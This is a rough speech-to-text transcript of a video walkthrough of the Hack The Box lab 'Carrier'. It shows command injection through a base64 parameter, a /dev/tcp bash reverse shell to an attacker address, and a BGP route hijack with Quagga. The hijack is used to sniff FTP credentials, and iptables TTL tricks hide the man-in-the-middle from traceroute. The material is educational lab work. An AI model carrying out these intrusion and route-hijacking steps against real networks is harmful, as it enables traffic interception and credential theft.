 what's going on YouTube this oops I can be doing carrier.from hack the box which was an amazing box because of the technologies it used and just the attack path you start off by attacking an Internet service providers webpage that lands you on one of their routers you then perform a BGP border gateway protocol hijack to snoop in on some of your customers data which then gives you information to log into their server and get route BGP hijacks are something you'll often read about because they've been used to steal data they've hijacked the routing of mining pools to steal cryptocurrency etc but it's really hard to get that hands-on experience just because routers are generally tough to emulate and many people just don't have access to that type of command-line interface however snow skin did an amazing job setting this up and if you just go in the box you have pretty much free rein to do what you want so let's just jump on in as always we begin with a map so - SC for default scripts SV enumerate versions Oh a output all formats put in the end map directory in koala carrier and then the IP address which is 10 10 10 105 this can take some time to run so I've already ran it looking at the results we have two ports open and one port as filtered FTP is the filtered port so this just means that when we send a packet to 10-10-10 105 to port 21 the server does absolutely nothing with it it can take one of three actions it can either accept a packet which I believe it sends a syn ACK back to us it can reject the packet which it sends a reset back to us or it can drop it which it means it just takes no action so because this one port is configured uniquely I'm going to guess there's an FTP service somewhere on this box and there's a iptables rule to drop it to verify it is not accessible externally so the next port we have is SSH on 22 and it is OpenSSH 7.6 Ubuntu for which I believe this is the bionic beaver which is I think Ubuntu 18 so we can just Google Launchpad OpenSSH source and then go to the first link this is slash Ubuntu slash plus source slash OpenSSH and this tells us the package name for all the you bunches so we can look at Bionic beaver this is 1 7 6 p 1 and we have 7 6 P 1 there so we know this is most likely going to be Bionic beaver and I think because it says 4 it's going to be the release main so the next book we have is 80 this is HTTP and it's running Apache HTTP D 2 4 1 8 and just experience tells me this is Ubuntu xenial so we have a mismatch here two different ubuntu z' so i'm guessing there's some type of virtualization technology and we can verify this by just googling the same thing essentially so we can do Launchpad Apache to source and go to Ubuntu plus source Apache 2 and scroll down we see two four one eight is xenial xerus if it was Bionic beaver it would have been two four two nine so this is definitely a little bit unique and I guess we're just gonna start off by checking out what's on port 80 because we don't have anything else to do so let's go to 10 10 10 105 and we just get a login prompt with two different error messages and Lightspeed in the title so I'm gonna Google white speed was that ly ght that is ly ght speed air four five zero seven see if this brings any results and it does not look like it does so this may be a custom application in which we shouldn't run go Buster against it I'm also gonna do a UDP nmap scan and this is something I normally do but I just normally don't show it because well showing this in every video where it's not relevant would it be that interesting so I'm just gonna do nmap - s capital u for UDP 10 10 10 105 and then vvvv to make this verbose and that's just going to mean that whenever it discovers an open port it's going to display it so while that runs let us also do a go Buster so go Buster - H and we're going to want to do - you for URL HTTP 10 10 10 105 then - W for word list user share word list der buster directory list - 3 medium and I'm going to specify - T 4 threads and put it as 50 and - go for help file we'll just do root normal I guess dot blog and normal to me is gonna be like directory list - 3 medium so we immediately have hits for a Tools image doc CSS JSS so let's go over to slash tools and we just get remote dot PHP and it says license expired exiting so nothing too interesting there we could try fuzzing it and seeing if we could put any custom arguments in it but let us now check over the doc thing to see if there's any documents we also have debug which is interesting so let's go to slash doc and we get a diagram for tack and error codes PDF so if we look at diagram we just see what looks like to be three different routers AAS 100 a s 208 s 300 so doesn't really mean too much but I'm going to save this just in case we want to reference it later so just do it W get against the image to save it and then let's go look at the error codes so going back to the home page I think it was 45 double O seven and nine so four five zero zero seven means license expired which happened when we hit remote dot PHP and for 500 nine means system credentials have not been set default admin user is set and it is the chassis serial number so we have to find a way to get the serial number of this chassis so let's go over to slash debug see if anything is there and I'm just gonna Google search chassis or serial and I don't really see anything so this and when we go back and look at our other EDD map and see if it has anything else does not look like it's come up with anything yet so normally when I do boxes I will do the EM map with a full port scan so that would be and map - P - and I also do the - su to do UDP so I just got to wait for this UDP skin to find an open port and then we begin because there's not much else we can do I guess we could try to like Hydra this login page but since we know the error message is saying system credentials are serial number I don't think Hydra is gonna be too successful so let's just I guess wait for an map to finish after like 15 minutes this scan finally finished and we have SNMP open so I'm just going to test the default community string so we'll do SNMP walk - v4 version 2c version 2c is the default - z4 community public this is the default community string and then 10 10 10 105 and we do get an immediate hit and it sends us a response back saying SN number net underscore at 4 5 JD X 2 3 I'm gonna guess this is serial number and then here we have the serial number so I'm going to go back to the paid and login with admin and that serial number what login passes and we are greeted to the dashboard it says the license is invalid ticket functionality is set to read only mode moir√© functionality is disabled yadda yadda a contact sales button that goes nowhere we can see it's just saying / - board dot PHP and then the anchor tag and then we have their motto Lightspeed network's delivering 1 millisecond latency across the planet since 1994 and I bet physics will have a thing or two to say about that because one millisecond latency is not possible across the planet and that reminds me of a really funny story if you google like Solaris can't send email over 500 miles over 500 miles you'll get to this thing from web mit.edu and it's absolutely hilarious about a sysadmin troubleshooting an email problem where his VIP couldn't send email over 500 miles and if you know anything about networking you may think that sounds asinine but this is actually makes sense once you read the whole story so definitely check that article out but going on with the page let's go check out this tickets page we have a bunch of tickets and up until this ticket there's nothing really too interesting we have an update right here saying cast comm and if we go back over to this diagram well know cast comm looks like it's an isp with the autonomous system number 300 and there's reporting issues with three networks 10 1 2015 10 1 2016 10 1 2017 they're all / 24 so I'm guessing each one gets 8.0 and one of the VIPs is having issues connecting by FTP to an important server and 10-1 2015 - 2015 that we had saw ordered and map they say no problems found stuck routes of whatnot we get this one about a nigerian prince and then ticket number 8 is saying something about testing bgp routes so and the court of the day here is QoS is for poor people which i find hilarious quote but let's go to the diagnostic page and this is where we have another warning saying the license is invalid and we should verify status so clicking this verify status button it looks like we're getting output where maybe it's from PS because we see like a username PID something state of this thread and then like the path so I'm guessing this is PID output of a PS command so let's make sure a burp intercept is on and go over to foxy proxy and make sure we use burp to intercept all URLs now click verify status and going into burp we see a check with some base64 so well we don't know that's basics before but it looks like it to me there's no equals on the end but doing copying that going over the decoder tab and decoding it as base64 we get quagga and look at the page every single one line has quagga and if we google I probably mints pronouncing that but Google quagga Linux or something let's see if we get anything we get quagga software routing suite which kind of makes sense with the tickets and all these AAS numbers we're dealing with some type of router so let us see if we can inject anything into this so I'm going to verify first and that it is probably PS output so I'm going to search for route and this should will show all the route processes so let's convert this back to whoops encode this as base64 and we can copy this go to the proxy tab let's send this to repeater and then paste the base64 and then highlight control you to convert those equals to I think that's URL encoding yeah URL encoding I think yep control you your own coding so click go scrolling down if we want we can make it a bit more pretty by doing render and we can see this definitely is the output of PS and this is probably a grep tag so let's go back to the decoder and see if we can inject anything so we going to put a semicolon echo please subscribe and if we see just please subscribe on the page we know we have code execution if we see echo we may not so let's see what it outputs back to us oh I didn't mean to go back to the proxy tab I wanted the repeater tab clicking go here waiting for the page to render go to the very bottom and we have please subscribe and we don't see any echo so we definitely have code execution let's try a reverse shell so I'm gonna do bash - I then I think that's greater than ampersand dev TCP ten ten fourteen three let's do port 9000 one and then that's zero that and one I believe if you just Google like a reverse shell cheat cheat this is on the list so I've just typed enough where I have that string memorized let's convert this to URL and we'll have to probably convert this plus maybe maybe not if it errors out we'll know to convert it so let's go back to a shell that cat listen on 9001 click go we don't get a immediate response back that is a good sign but we don't get a shell so let's convert this as well click go don't get immediate response and this time we do get a shell and the reason for that is plus an HTML just mean space or maybe plus in your Almain space plus mean space in some language so this was really just translating it and this Plus this percent to beat was getting translated to a space which breaks the base64 so we had URL encoded it so that's why that works so now we get a shell and it says root at r1 do it LS we get a user text and test intercept pcap and interesting that it says root so this confirms our suspicions that we're probably in some type of container do LS - la and we can see the test intercept pcap is zero I'm going to do an LS - la on slash to see if I find like a dot dr. M I do not and now I'm going to cat /proc one and vine and we see the container equals LX e so within a LX c container so no docker just in LX e most likely I'm going to do Python - C import PT y PT y dot spawn then bash and I forgot to do single quotes around this so it'll probably error out looks like pythons not there that's not the error expected so try which Python 3 okay Python threes on the box so Python 3 - C input PT y PT y dot spawn then - and then we can do control-z stty raw I forget this stty command I think it's SCT why echo - raw echo - raw hit FG nope s TTY raw - echo hit F G Anna and now we have like tab or didn't clean and control C and things like that so just makes a shell a bit better next thing we want to do is like export or terminal variables so we can do clear so export term equals X term and now control L will clear the screen so now it's safe to assume the game plan should involve some type of lateral movement because we know we're running an l XE container as root and n / root is only user dot txt so we know we've owned this castle but our flag is in a different castle unfortunately we don't know where that castle is so we have to start surveying the land and see if we can find out where the next place to move is so we should think all the way back to the Recon and we had two ports open one point as filtered so let's see if that filtered port is now accessible or were on the host where that filtered port is so to do that we're just going to do a net stat - a OMP and grep for lists with all caps I'm sure there's a more elegant way to do that but this is just how I do it and we see zebra BG PD as an SSH all listening we don't see HTTP which is a bit odd because we exploit this box via HTTP so most likely there's some type of service the website interacts with which then we exploited and we landed in that container not the one where HTTP was listening the other thing we should start looking into is if the containers are ubuntu Zen yule because we had a host mismatch when we did nmap 10 10 10 105 so i'm gonna do cat Etsy OSB - release and we see annual so it's safe to say that probably the containers are gonna be ubuntu zhenia l-- and the host is gonna be just ubuntu Bionic and we can confirm indeed that port 22 isn't going to this container by just doing like a ssh key scan on localhost and then doing that on 10 10 10 105 and what this is gonna do is tell us the fingerprint for both of them and if the fingerprints don't match then it's a different service so we see let's see SSH - RSA ends in BBD and ssh - RSA ends n 9 LJ so indeed 10 10 10 105 and the SSH service in a container are different so let's take a look at the ARP table and this is gonna tell us boxes that are currently talking to the box we are on and we have a few IP addresses there's one last thing we should keep in mind when going back and looking at all the Recon is if we go to a browser go back to the tickets page there was a ticket that says a very important FTP server is in 10 120 15.0 and we don't see that in the herb table so if we do ping 10 1 2015 1 is it 15 yes 15.1 I'm assuming that one's gonna be a gateway and it is so we can get to that Network we just can't get to or we just don't know what the box is on that so to find out which with the box is I'm just going to upload and map to this box so let's go back to our host I'm gonna go to opt static binaries and if you don't have this just github on static binaries I could type that probably has a lot of typos and then I think this is the exact repo I have cloned from so if you just go there I'm gonna find dot and grep for and map and we're just going to upload this so make to HDB Fox's carrier dub-dub-dub and I'm going to copy up static binaries and Matt to a directory CD there and do Python em simple HTTP server and now we can download and map so let's check if curl is on the box it is so he curl 10 10 14 3 port 8000 and Matt - Oh felt file and map download that and now we can start scanning away so we wanted to do a nmap on 10 1 2015 so let's do dot slash and map - P no we don't want to do ports yet we'll just do 10 1 2015 0 / 24 actually we will if we're in a rush we can just do - p21 and scan for FTP here we may also want to do like - p21 if we're trying to be a little bit more quiet so we don't do full port scans on everything because that is a little bit loud so let's let this and map oh that was odd UDP payloads are disabled cannot let's try that again and Matt - p21 10 1 2015 / 24 let's do verbose so we can see as it discovers things but I haven't seen that a crash before we can do actually - Cowpen to disable ICMP stuff 10 1 2015 0 / 24 and the reason why I'm doing that is because we see IP proto I see and P here and ICMP ID 206 and I have to do that / so I just disabled ICMP hoping we can just skip that error message so I'm gonna let though we're gonna have to let it finish it immediately told us one port was open if we do the - - open flag we won't see all these filters so we can see 10 1 2015 10 does have FTP open so if we tried to do netcat on that port 21 we can see it's running vs ftp d 3.0 point 3 which I know is not a vulnerable version of vs FTP we can try doing the FTP command there check if anonymous login is enabled it is do dir and we get in legal port command majority in use I'm not actually sure what that is I've never actually logged in and honestly on this so I don't know how it was configured but that may be something to investigate but we're just gonna move on and the other thing I wanted to take note of is when we did netstat al NP grep for listening we saw a bunch of BGP which is a network networking protocol and zebra if we do crontab - L we see there is a cron that runs every 10 minutes so let's take a look at that we can't restore dot SH we can see it's killing a program called vty SH stopping a service quagga and then copying configs back over and then starting it so let's look at exactly what these configs are to have an idea what this cron is doing and we see zebra configuration saved from vty and then it looks like a cisco config file there is a another config file so quagga bgp cat this one and we see a bunch of BGP commands with a bgp router ID networks neighbors we do up - a n let's see do any of these neighbors line up 1078 10 - and that is this neighbor and we also see a which is this neighbor we're on vty SH we get access into the quagga router interface which is very much like Cisco so we can do like show running config and then print out the config that we see so right now it's kind of safe to say that we may have to do some type of BGP attack because well we see all the we see the BGP config it reverts every 10 minutes we have three different routers so something's leaning towards a BGP hijack one thing I just remembered was back in the documents directory there was this diagram for TAC which had zazic Comcast come and might speed networks and based upon the config we can probably find out what everything is so I'm gonna guess that we are a s 100 light speed networks because this is a web page we exploited then we have a s 200 at ten seventy eight ten - that is probably zazic uhm and then we have ten seventy eight 11 - as a s 300 which is Cass comm so let's put this diagram in something we can edit because chances are we're going to have to do this or at least map where hosts are so I'm going to go to draw dot IO which is kind of like a web version of Visio and we can just save to device create a new diagram basic should be fine and their search for shapes router and then we're going to place three of them so one two three and I guess I can make this bigger so we need there's going to be a s 200 this is a s 300 and this the one we control so see is there a color background color red that did nothing a s100 say can I change that here I'm not sure exactly how to change the color but yes 100 we own so we should also put links see if I get rid of that should be able to connect this connect this what this on the side oh well nobody fine so let's change these lines to diagonals change this line man Jordan I Oh does not like the setup I have going on right now so you can I change that for the font size see here it is okay and then we can just change it to be these double lines and then we need to add text where do I add text here Oh double click and it finally went through this is 1078 what is it 10 - so we'll just do slash 30 I'm not sure these are actually slash thirties but for documentation purposes in this box it should be fine this is 11 0 slash 30 so we need to figure out exactly where 10 1 2015 12 go what was that IP if we go back here search for nmap let's see it is was host 10 1 2015 10 so we have to figure out where that box is so I'm just do a trace route we don't have trace route only trace route 6 let's go vty Sh and we can do show route for this route map not found show IP route then IP and we can see routing entry for this guy is going to be out 1078 11 to be a 8th tool to so 1078 11 is this link so we can put the ftp server here so let's put ftp label this 10 1 2015 10 and we can draw that link and change the line okay we can also create us so if we do attacker or let's see attack this is oddly fitting so this will be us so as we're drawing this out and we think that this is a BGP attack we can assume there's probably going to be a link that goes here and just thinking about it I'm assuming someone's going to be sitting here so we can do person and we don't know who this is but I'm guessing there's gonna be a person here and we probably have to take over this IP address just knowing that the box is vulnerable and seeing how it is set up so let's look at a bunch of BGP information we can do show IP BGP summary and get information if you don't know Cisco interfaces or I say Cisco interfaces but I got some name you don't have to type the full command out if I do start typing I do tab show works or I can just leave it shorthand if this is the only one I can also at any time hit question mark and that's kind of like tab autocomplete so show IP BGP summary we can see neighbors the time they've been up and their numbers or routes and think of AAS numbers as their blocks of IPs and it's how BGP routes think of them kind of like I guest host names or host groups I don't know a good terminology but they are definitely useful let's if we do like a SN lookup we can look at like let's do Google Google go okay so we can see Google has let's do this a s number and we can do look up this a SN number so if we do IP info a SN look up this is just the tool I like using IP n feo let's see a SNRIs B Network P dot IP info asn what's the exact page we'll just go here and then send this a s number we see the lookup for Google and this tells us that who is oh there's no known IP ranges for this one we picked a bad example let's do the block that contains 888 the infamous DNS server I know this one will contain IP addresses of Google so we can just search this and we can see this was allocated back in 2000 it has 8 million IPs and we can see various IP ranges assigned to this a s block we can also get ipv6 ranges which is definitely handy for enumerate ipv6 ranges of corporate networks and we can see the peers of this a s up streams down streams whatnot but bunch of I guess carrier grade routing so you don't have to know that but it is handy when building scopes for companies if you don't know what IP addresses they own maybe they have IP is registered them but they forgot about that still point somewhere that is interesting so definitely look up a s rail earth numbers I think it's autonomous system number we can do show IP BGP and see all the routes so let's say 10 one 2015 this is advertised to us twice that's why we don't see anything right here this caret means it is the preferred route and we can see it's routed directly to a s 300 this route is going through 200 and 200 saying I know how to get there send it to me then I'll send it to 300 there so that's kind of how to read this BGP routing thing let's see what's another good command we can do show IP BGP 10 1 2015 0 / 24 and we can see more details about the advertisements so we can see that 300 advertised from 11.2 and 10.2 and that's the path and this one is preferred we can also query a bgp router for they're advertised routes so if we do show IP BGP neighbors 1078 10 to a TV and that hit tab it will say advertised routes and we can see the routes this guy advertises so the ones with a path question mark these are locally connected interfaces and then these are BGP routes it moves so what we want to do is go back to draw dot il and we want to advertise a BGP route for this guy so it's relatively simple and BGP is all like policy-based there's not much actual technical things preventing people from doing bad things so there is a Twitter that shows like BGP hijacks so if we do Twitter BGP hijack is it BGP stream is this it that shares a bunch of interesting things because this hijacks happened by mistake all the time of people just spewing up BGP additionally there have been actual attacks I think my favorite one to read about is someone hijacking a BGP of a known Bitcoin miner group and then stealing the traffic and doing something that's a fun read as well if you just Google like BGP Bitcoin mining hijack you should find it but let's begin with hijacking this route so before I do anything I'm going to move restored on SH to restore it to SH because I don't what this is it contest shell on tab - shell I don't want this cron executing then killing my shell reverting everything so I just disabled the machines self recovery feature and let's do vty SH and we have to enter configure mood so configure T or you'll see me type compte a lot to do that because that's the shorthand so we have to advertise that route so we're going to do router or before you do this if you're in configure mood and you're not want to run a non config command just prepend do you like do show run so what I want to do is go into this code block and advertise a BGP route for 10 1 2015 0 so we'll do router bgp 100 so now i'm in this config block and i'm going to do network 10 120 15.0 and the advertised route was a slash 24 for from a s 200 I'm gonna do a slash 25 because normally a networking the most specific match wins and slash 24 means this IP can be 0 to 255 a slash 25 takes away one bit and this can be 0 through 127 so I'm advertising a more specific route which means I should be preferred and then we have to think that maybe it so let's do clear IP BGP store out I think and this is just going to clear out Sandri advertise everything so if we do show IP BGP 10 1 2015 / 25 we can see we are advertising it to 1078 10 to 1078 11 - and if we do show IP bgp neighbors 1078 10 - that is going to be this guy yes 200 and then select advertised routes we can see he is also advertising or route so we know we have successfully pushed this route so what we can do is exit out of here do a TCP dump so we can do TCP dump - i ne for interface any and then do - w-4 right will do FTP - 1 dot cap what else do we want to do port 21 I'm only interested in that traffic so I'm going to let this run did I screw something up TCP dump ok TCP dump - i ne ok dump - I Eddie - W oh I may not be able to write to slash off let's put in route and rerun this command copy paste there we go so I'm going to let this go for about a minute or two just so we make sure we get a packet and then we will analyze it so I'm going to press ctrl C to kill this TCP dump do LS - la we can see let's see FTP one cat does have some stuff so let's do base64 on that file if I can type that correctly and we get a bunch of data as more than expected so copy all this and then let's send it over so let's do make the pcaps go in there V FTP - one B cap what cap we called it and I want dot B 64 and paste it base 64 - D on this file and then let's open in Wireshark let's open Wireshark I don't want that fullscreen file open FTP one cap and let's just do this oh I thought that would have got my wife cook screen let me do this something I lost my terminal everything hung Wow which please subscribe this is just a quick file I had wrote to do some things I'm hoping to grab there we go now I can click and let's see Firefox windows a wire Sharks window name is FTP so this is how I always get all the terminals the correct size because I got tired of dragging them around so there we go so we can indeed see that we are getting packets FTP packets from 1078 10 - to destination 10 1 2015 10 but we're never completing the handshake so what's happening is this actor is sending us the packet we're getting the packet and then let's see we're getting the packet we're probably sending it to a s 300 which it got the route the BGP route saying we own it so it's either sends a packet back to us or it's sending it to a s 200 then back to us because if we look at we go here let's go back to the box vty sh and do show IP bgp neighbors 1078 11 to advertise droughts we can see he's advertising the rail to 11.1 so he's sending it it's the packets getting here packets going to us which we want that's why we see this in then is going back down here because we're setting off saying we think that's down here this guys will gain his routing table and then sending it right back to us so that's not good we can also confirm that with a ping so let's do that same Wireshark so we'll do no hump to background this TCP dump TCP dump - i ne - W ICMP dot cap and I'll just background this with and and then we can just hang 10 1 2015 10 let's just do paying - C 1 so we send one ping to that IP address and let this time out maybe there we go and now I'm going to run a Pico on TCP dump to kill it psst F crap TCP dump kill 61 0 6 4 and now let's base64 that ICMP capture that's huge let's do TCP dump again and let's say no hop not port 22 and I'm guessing that's big because of our ssh capture so PS - etf grab TCP dump verify we are running it hang 10 1 2015 10 I've got the - c1 again okay kill the TCP dump 61 0 70 day 64 ICMP cap ICMP let's just take this and see what's in it maybe - W didn't overwrite it something happened and I really don't wanna copy that my terminal remove ICMP cap and run this again no hug TCP dump hi Annie ICMP cap port not 22 I wonder if I did port 22 and not is it not port 22 I think I typed point 22 and only captured it and that time I did not background no hump so delete the file background no hump I swear I'm gonna get this right eventually paying 10 1 2015 10 forgot the - 1 but we'll just let that slide ok we sent 5 pings P kill TCP dump TCP dump has been killed B is 64 ICMP cap okay I have no idea why we're getting so much traffic it probably has to do with the fact I'm not SSH din so it's not over port 22 it's probably over like port 80 or something hindsight is twenty-twenty CDP caps V ICMP cap probably should just put like ICMP in the filter for TCP dump and see if it grabs that so that was probably the smarter way to go about that open not on that format why shucks understands because I didn't base64 decode it it's been one of those videos I guess now file open okay ICMP there we go and this is why I wanted to see so then it would be nice if we only did one ping so let's see a TTL sixty-four here so I'm guessing it's the first four packets my clickings not working fast right now or I can't highlight multiple packets but here we go we send a ping request from 1078 11.1 to 10 1 2015 10 we're getting a ping packet from 10 7811 to and we're also getting a packet a redirect from 11.1 to us and let's see yeah we can see the TTL keeps decrementing so 64 63-62 comes from us comes from 11.2 goes from us goes back to 11.2 so we can kind of see a loop of that ping packet just traveling between these two so what we want to do is cut off this route so we don't want to advertise our BGP route to that guy so let's see can I do this yes this is what we want to do that realm and not advertise a packet so hopefully that routing loop made sense and how we figured it out because I thought it'd be easy to explain then I actually did a job of it so what we want to do is go back in vty SH compte and in order to block a route we need to add it to the route map so this route map to a si 200 permit 10 this means advertised routes to a s 10 or a s 200 permit and then 10 is the line number and it can go like 0 to 999 or something but with nothing there we're permitting everything it's got a blanket permit all at the very bottom so what we want to do is go into a s 300 put a deny and put our subnet in the deny route so we're not advertising it to a s 300 so to do that when config mode we need to create a IP prefix so that's IP prefix list we'll call this please subscribe I will call this yes please subscribe it's fine and we permit 10-1 2015 0 slash 25 this is the subnet we are advertising so we can do route map to a s 300 question mark deny and we'll do 5 so now we created a new code block right here that's to a s 300 deny 5 and we want to add logic that blocks our route so we'll do match IP address that is in prefix list please subscribe so prefix list if we do question mark we can only do words we do match IP we got access list number extended access list words or prefix we don't have IP address so that's why we created that prefix list first so this is essentially just mapping a name to IP address so we're saying any IP address in this please subscribe prefix list deny so if we do do show run we can see route map to a s-300 deny v match IP address prefix list please subscribe that goes up here and to this this permit doesn't matter because the deny is here so we can just get out of config mode and do a was it clear IP bgp store out and then we can try to ping can I ping from in here I can 10 1 2015 10 and we're not getting a pain so if we wanted to we could go back in TCP dump and this time I'll do it correctly TCP dump I any that's W ICMP - 2 . l ICMP so we're filtering only on ICMP packets and that should be good psdf grep for TCP dump we are running it so ping - C 10 1 2015 10 I've got the one sent that one ping packet now we can base64 ICMP - 2 dot L LS - la oh hell SLA /root it didn't write any data so I was wrong when I said I was gonna get right let's just do no hub and then pee speed up - I any and we'll do - W ICMP - 2 . l and capturing all traffic will just get a big capture that file that's fine 10 1 2015 10 one day I'll remember - C 1 ok base64 ICMP - and let's copy this go back the ICMP - 2 . lp64 paste play 64 - d and undo this go into Wireshark control odor open and I'm not in P caps move ICMP do got out to P caps now we should be able to open this and looking at ICMP we send a ping request and now we're getting it from 12.2 if we remember the last one we still got it from 11.2 I believe so let's do ctrl o to open a previous one and we can see the TTL mysteriously went from 64 to 62 so let's look at the first ICMP Pat capture and we see we don't have any TTLs jumping we have 64 63-62 and we're getting it from 11.2 so what happened is if we look at this we sent the ping packet we go to a s 300 because we're just not advertising the route to it we still know the route is to it if that makes sense so it just doesn't know to come back to us so we sent the ping packet to it it looks at its routing table and decide to send it to a s200 so what happened is we advertised the route 10 1 2015 10 to both of these and a s 200 decided to advertise it to a s 300 if you remember when we first were looking at routes vty SH show IP BGP is it route can I do that show IP route 10 show IP BGP 10 1 2015 Siro / 25 no route there that is us so we can see we're just advertising to 1078 1 to attend to if we look at 120 15 years last 24 we see the guy actually we got two advertisements one was 301 was from 200-300 and when I say 200-300 I mean a s 200 is 300 so what happened was we essentially killed this guy but there was still a backup route of this a srl so send a ping packet this guy saying ok to get to 10 1 2015 10 I have to go through a s 200 then a s 100 so we sent the packet here and then it came back to us so 64 TTL 63 TTL 62 TT o and gets back to us every time a packet jumps a router the TTL decrements that is time to live one in time to live gets to zero the package just dies so what we have to do is say okay don't advertise or hijack route to a s 300 but when we advertise it to a s 200 tell him do not advertise it to anyone so now we're going to have to blocks on that and then if we do that we should be able to get the packet how it's supposed to go so hopefully this is all making sense so vty Sh I'm already in it we can do I can just do show run so we have to edit go into this code block put a match and then tell it to not export so I'm gonna do compte to edit config mode route map to a s 200 permit I'm going to put it in code block 5 this can be 1 to 65535 and it goes in order so 0 1 2 3 4 5 whatever is the lower number takes precedence so it's a good thing when doing these to keep them in decrements of increments of 5 or whatever because if I just did if I started a rule at 1 and I wouldn't put something before it I'm kind of screwed and it's a pain to reorder rules so you do the first rule at like 10 the second rule at 20 and then that gives you some leeway to modify them or put things before after so now we're here we want to do match IP address prefix list please subscribe and then we want to do set community yes I'm in the correct thing and then no - export and no - export is going to tell us or tell it not to advertise it so we can do end to get out of configuration mode and then clear IP bgp store out and now if we paying 10 1 2015 10 we should get to it maybe not what did we screw up oh there we go it just took war from the BGP advertisement to go through but now we can ping 10 1 2015 10 so all the routing is good so let's do no help TCP dump - w-would you - I any - W profile let's do FTP - 2 . cap and we can do port 21 I don't know why back rounded it but we'll kill TCP dump in about one minute so we have enough time where that client should have sent the FTP commands so we can P kill TCP dump it did not die PS - EF grep TCP dump and we have a lot of TCP dump drawning kill will do p killed - f TCP dump okay they all died so let's do base64 on FTP - - cap whoops copied way too much let's go here set edit mode go down copy we can do VI FTP - cap dot b64 paste basis for - D - FTP to cap there we go ctrl o to open and I'm guessing I'm not in the correct directory I am NOT move ftp to to P caps so if we open this get rid of a ICMP filter and we actually see FTP is we see a lot of duplicate packets that's why because we're on any interface if we just specify interphase probably one we wouldn't get those but if we just go to a TCP packet and do follow we can't follow a stream or my goo is lagging let's see can we follow TCP stream we can see the traffic of the user trying to FTP with root and the password of bgp telco routing so if we FTP 10 1 2015 10 oh we have to do it from this guy so FTP 10 1 2015 10 root passwords bgp telco with success oh maybe we have to go active movie mode active only support stream we can try SSA chain with this so let's just do SSH route at 10 1 2015 10 and come on see is w get here it is so we can try like W get - M FTP root password at 10 1 2015 10 see if W get works W get works so we can go in the file we got root attacks we also got dot SSH and authorized keys and if I'm doing this I can't do 10 1 2015 10 because I don't route to that we have to do 10 10 10 105 password and we're logged in so let us first clear that's pain and let's see we can do oxc list to show VMS and we see all 30 routers so let's do something fun so let's go create three sessions to this so 10 10 10 105 paste they click I did click on something Wireshark has it and I close Wireshark strings FTP - yep - I PGP there we go so let's SH 10 10 10 105 sage 10 10 10 105 and I want to get into all three routers so we can do LXE exec and then r1 will do or to first wait oh oh XC exact right to bash there we go LXE exact our three bash I wanted our went to bottom because I want this to be the bigger pain so I like C exec r1 - so now we got all three routers so we can see exactly what is happening so we can do vty SH vty SH vty SH actually I don't wanna do this yet my bad let's exit I have all this so router one router to router 3 I want to go from this guy and ping 10 1 2015 10 so let's go ping 10 1 2015 10 and we can see we're getting a TTL of 62 back so this is kind of indication that the BGP hijacks happening because we'd expect or the TT of 63 if we know the rel because it decrements here and that's it so 62 means we're going through two hops we can do traceroute so 10 1 2015 10 and we can see the box so if I do I pee tables - tea mangle - a pre routing - ie 2 SJ TT l TT o increment 1 so what this did was just say ok every time router 1 receives a packet increment that TTL by 1 so when the system decrement sit by 1 it does nothing so if I do a ping 10 1 2015 10 we're now getting the a TTL of 63 if we do trace route 10 1 2015 10 we still see my box because it's actually not decrementing the TTL everywhere if we wanted to we could do iptables t mangle a pre-rounding because we just did the TTL on this guy we want to do the TTL here so if we do what if I do this I do t10 mangle - F did that clear everything - - flush ugly tables save okay I don't have any manga routes left so 10 1 2015 10 so it's back to 62 so if instead of 8th - which is this interface I play that TTL increment to this interface let's see what happens IP tables - T mangle a pre routing i1j TTL TTL increment 1 paying 10 1 2015 10 and traceroute 10 1 2015 10 we see I became invisible and the TTL is still lowered by one so this is definitely really bizarre because I'm pinging this with my starting TTL of 64 and getting a TTL of 62 back and I'm looking at traceroute and I'm not getting anything it's only showing me two hops so that is definitely bizarre so if we wanted to do the perfect aamir in the middle we could do eath 2j TTL TTL increment 1 and now if we ping 10 1 2015 10 we get the TTL of 63 and we also trace route 10 1 2015 10 are now invisible in the hub so that is the way to become completely invisible when doing this bgp hijacked I'm sure there's other ways to identify it but I just found that funny and if you ever want to set like a passive device and do man the Middle's and not be seen over trace route you need to increment your TTL by 1 because that just breaks traceroute so let's see what else can we show I guess we can restore everything so restore to and show a unintended realm so opt tell SLA oh I deleted the file I think con tab - L o LX e exact one - opt yeah restore - here it is so this is restoring the config so if we do V 2 is H so run we don't have anything so we could just start playing with the bgp route so let's do what we did the very first time and prove that when we only severed this link that this guy got the advertisement from this guy so we can do compte IP prefix list please subscribe permit 10 1 2015 10 a 0 / 25 then we need to do router bgp 100 i think it's a hundred to show run yep router bgp 100 network 10 120 15/0 / 25 so now we advertise the route so if we exit exit clear IP bgp stir give this a few seconds we should see this guy has the route so bt y sh show IP BGP 10 1 2015 0 / 25 and show IP BGP 10 1 20 15 years last 25 v2 is H so IP BGP so router 3 that is this guy is showing he has two routes - 10 1 2015 year / 25 one is through 200 100 so he knows this route and he also knows directly to 100 so when we blacklisted him this route went away and was no longer the best route which left this rail so let's show that show run actually before you show that we can no nevermind so - Fusion if I do one thing it'll make the box a bit more of a pain to revert so we'll do that at the very end it's an unintended way to do this box so compte route map to a s 300 five and now we just want to match IP address prefix please subscribe and clear IP BGP star help and now when we read run these commands we can see router 2 hasn't changed he still knows the direct route to me but router 3 that one advertisement went away so 200 100 is the way to go so when we did compte and said route map to a s 200 permit 5 and then this line set community no export do clear IP bgp store now and the reason why I said do here and not before is it because I'm in config mode and was lazy didn't feel like leaving config mode so now I can show this route he still has it and this guy still has it you should not have it let's see - a s 200 permit 5 set community no export that do command should have worked clear IP BGP stir out ping 10 1 2015 10 oh did I do something wrong ok no he does not so I do come in either took a waddle run or just did not but anyways we have that 10 1 2015 year route doesn't exist so the guy sends it back to this guy if you want to highly recommend playing around with routing on this box because there's a lot of cool things you can do final let's restore the box op to score BTY Sh if we do show IP bgp 10 120 15 years last 25 he's not in any tables because we're not advertising that realm so let's just advertise that route and then we'll change an interface IP so let's do compte IP prefix list unintended 10-1 2015 0 / 25 - I screw something up let's see IP prefix list unintended 10 1 2015 co / 25 Oh I'm forgetting permit from there 10 there we there we go so show run do show run okay I have that in there so let's do route map to a s 200 no we want to do router bgp router bgp 100 network 10 120 15/0 / 25 I don't think I actually had to do that prefix list so let's do clear IP BGP start out ok so now we have that routing loop so if we do exit paying 10 1 2015 Sierra 10 we can't ping because we got the routing loop of setting it to this guy this guy sending it back to us so if we go to router 2 we can do show IP BGP 10 1 2015 10 slash 25 and he's going to send it directly to us he never even thinks about sending it to this guy because this guy's advertising 10:1 he's advertising 10 1 2015 CEO slash 24 which is a larger subnet then slash 25 so he sends it to us because we got 